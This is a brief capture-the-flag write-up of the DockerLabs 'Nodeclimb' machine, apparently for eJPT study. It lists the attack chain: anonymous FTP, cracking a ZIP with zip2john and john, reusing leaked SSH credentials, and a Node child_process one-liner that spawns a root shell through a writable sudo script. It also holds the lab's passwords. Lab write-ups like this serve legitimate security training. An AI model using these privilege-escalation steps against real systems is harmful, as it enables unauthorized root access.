---
type: machine
platform: dockerlabs
difficulty: easy
ip: 172.17.0.2
cves: []
tools: [nmap, john-the-ripper]
techniques: [ftp-anonymous-login, zip-cracking, sudo-abuse]
tags: [ejpt:assessment, ejpt:host-net-pentest]
related: ["[[balulero]]", "[[obsession]]"]
---

# Nodeclimb

**Writeup:** [raw writeup](../../writeups/dockerlabs/easy/nodeclimb.md)

Easy box that chains anonymous FTP → a password-protected ZIP → SSH creds, then a `sudo node` writable-script escape.

## Path

1. **Recon** — `nmap` shows `21/tcp ftp` (vsftpd 3.0.3, anonymous allowed) and `22/tcp ssh`.
2. **Anonymous FTP** — `ftp anonymous` → download `secretitopicaron.zip` ([[ftp-anonymous-login]]).
3. **Crack the ZIP** — `zip2john` + `john` → password `password1` ([[zip-cracking]]).
4. **Credential leak** — the ZIP contains `password.txt` → `mario:laKontraseñAmasmalotaHdelbarrioH`.
5. **SSH foothold** — `ssh mario@…`.
6. **Sudo escape** — `sudo -l` shows `(ALL) NOPASSWD: /usr/bin/node /home/mario/script.js`. `script.js` is writable by `mario`, so overwrite it with `require("child_process").spawn("/bin/sh",{stdio:[0,1,2]})` and run `sudo -u root /usr/bin/node /home/mario/script.js` → **root** ([[sudo-abuse]]).

## Credentials / secrets

| Item | Value |
|------|-------|
| ZIP password | `password1` |
| mario (SSH) | `laKontraseñAmasmalotaHdelbarrioH` |
| sudo (mario) | `(ALL) NOPASSWD: /usr/bin/node /home/mario/script.js` |

## Takeaways

- Anonymous FTP is a classic first stop; files there are often password-protected → crack them ([[ftp-anonymous-login]], [[zip-cracking]]).
- `zip2john` turns a ZIP into a john-crackable hash ([[john-the-ripper]]).
- A `sudo` entry on a *writable* script is a free root shell — overwrite the script, then run it with `sudo` ([[sudo-abuse]]).
